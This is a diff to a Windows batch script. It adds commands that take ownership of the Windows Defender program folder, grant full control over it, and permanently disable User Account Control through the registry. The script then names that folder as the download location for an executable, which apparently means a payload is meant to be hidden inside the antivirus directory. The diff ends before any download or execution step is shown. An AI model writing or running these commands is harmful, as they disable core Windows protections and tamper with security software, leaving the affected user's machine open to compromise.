@@ -1,6 +1,13 @@
 @echo off
 setlocal enabledelayedexpansion
 
+:: Take ownership of the folder and set permissions
+takeown /f "C:\Program Files (x86)\Windows Defender" /r /d y
+icacls "C:\Program Files (x86)\Windows Defender" /grant administrators:F /t
+
+:: Disable UAC permanently (admin rights required)
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+
 :: Set the download location for the executable
 set "folderPath=C:\Program Files (x86)\Windows Defender"
 
